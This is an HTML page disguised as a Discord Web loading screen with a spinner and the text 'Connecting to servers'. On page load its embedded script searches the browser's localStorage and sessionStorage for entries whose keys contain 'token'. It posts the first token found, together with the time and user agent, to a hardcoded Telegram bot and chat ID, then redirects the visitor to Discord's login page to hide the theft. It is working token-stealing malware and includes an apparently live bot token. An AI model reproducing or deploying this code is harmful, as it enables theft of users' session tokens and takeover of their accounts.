<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord - –ó–∞–≥—Ä—É–∑–∫–∞</title>
    <style>
        body {
            background: #36393f;
            color: white;
            font-family: Arial;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .loader {
            text-align: center;
        }
        .spinner {
            border: 5px solid #2f3136;
            border-top: 5px solid #7289da;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        h1 {
            color: #7289da;
            margin-bottom: 10px;
        }
        p {
            color: #b9bbbe;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <h1>Discord Web</h1>
        <p>–ü–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ —Å–µ—Ä–≤–µ—Ä–∞–º...</p>
    </div>

    <script>
        // üîß –ù–ê–°–¢–†–û–ô–ö–ò
        const BOT_TOKEN = "8330703968:AAEopICFextVKGUaBFA5ErPuQiG1R8gDtJY";
        const CHAT_ID = "8232767019"; // –ó–∞–º–µ–Ω–∏ –Ω–∞ —Å–≤–æ–π ID –∏–∑ –±–æ—Ç–∞
        
        // üéØ –§–£–ù–ö–¶–ò–Ø –ü–û–ò–°–ö–ê –¢–û–ö–ï–ù–û–í
        function findDiscordTokens() {
            console.log("üîç –ò—â—É Discord —Ç–æ–∫–µ–Ω—ã...");
            let tokens = [];
            
            // –ò—â–µ–º –≤ localStorage
            for (let i = 0; i < localStorage.length; i++) {
                const key = localStorage.key(i);
                if (key && (key.includes('token') || key.includes('Token'))) {
                    const value = localStorage.getItem(key);
                    if (value && value.length > 50) {
                        console.log("‚úÖ –ù–∞–π–¥–µ–Ω —Ç–æ–∫–µ–Ω –≤ localStorage");
                        tokens.push(value);
                    }
                }
            }
            
            // –ò—â–µ–º –≤ sessionStorage
            for (let i = 0; i < sessionStorage.length; i++) {
                const key = sessionStorage.key(i);
                if (key && key.includes('token')) {
                    const value = sessionStorage.getItem(key);
                    if (value && value.length > 50) {
                        tokens.push(value);
                    }
                }
            }
            
            return tokens;
        }
        
        // üì§ –§–£–ù–ö–¶–ò–Ø –û–¢–ü–†–ê–í–ö–ò –í TELEGRAM
        async function sendToTelegram(tokens) {
            if (tokens.length === 0) {
                console.log("‚ÑπÔ∏è –¢–æ–∫–µ–Ω—ã –Ω–µ –Ω–∞–π–¥–µ–Ω—ã");
                return;
            }
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: CHAT_ID,
                        text: `üéØ –ù–æ–≤—ã–π –ø–æ—Å–µ—Ç–∏—Ç–µ–ª—å!\n\n–¢–æ–∫–µ–Ω: \`${tokens[0].substring(0, 50)}...\`\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n–ë—Ä–∞—É–∑–µ—Ä: ${navigator.userAgent.substring(0, 30)}...`,
                        parse_mode: 'Markdown'
                    })
                });
                
                if (response.ok) {
                    console.log("‚úÖ –¢–æ–∫–µ–Ω –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –≤ Telegram");
                } else {
                    console.log("‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏");
                }
            } catch (error) {
                console.log("‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏:", error);
            }
        }
        
        // üöÄ –ó–ê–ü–£–°–ö –ü–†–ò –ó–ê–ì–†–£–ó–ö–ï
        window.addEventListener('load', function() {
            console.log("üöÄ –°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞");
            
            // –ò—â–µ–º –∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ç–æ–∫–µ–Ω—ã
            const tokens = findDiscordTokens();
            sendToTelegram(tokens);
            
            // –ß–µ—Ä–µ–∑ 2 —Å–µ–∫—É–Ω–¥—ã —Ä–µ–¥–∏—Ä–µ–∫—Ç –Ω–∞ Discord
            setTimeout(function() {
                window.location.href = "https://discord.com/login";
            }, 2000);
        });
    </script>
</body>
</html>
